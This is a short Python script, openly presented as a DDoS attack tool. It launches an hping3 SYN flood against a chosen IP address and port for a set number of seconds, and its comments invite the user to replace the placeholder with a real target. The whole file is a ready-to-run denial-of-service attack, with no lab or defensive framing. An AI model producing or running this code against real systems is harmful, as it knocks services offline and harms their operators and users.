import subprocess
import time

def launch_ddos_attack(target_ip, duration, target_port=80):
    command = f"hping3 -S --flood -p {target_port} {target_ip}"
    print(f"Launching DDoS attack on {target_ip} at port {target_port} for {duration} seconds")
    
    # Start the DDoS attack
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)

    # Run attack for specified duration
    time.sleep(duration)

    # Terminate the attack
    process.terminate()
    print("DDoS attack finished.")

if __name__ == "__main__":
    target_ip = "192.168.1.100"  # Replace with the target IP address
    duration = 10                 # Duration of attack in seconds
    launch_ddos_attack(target_ip, duration)
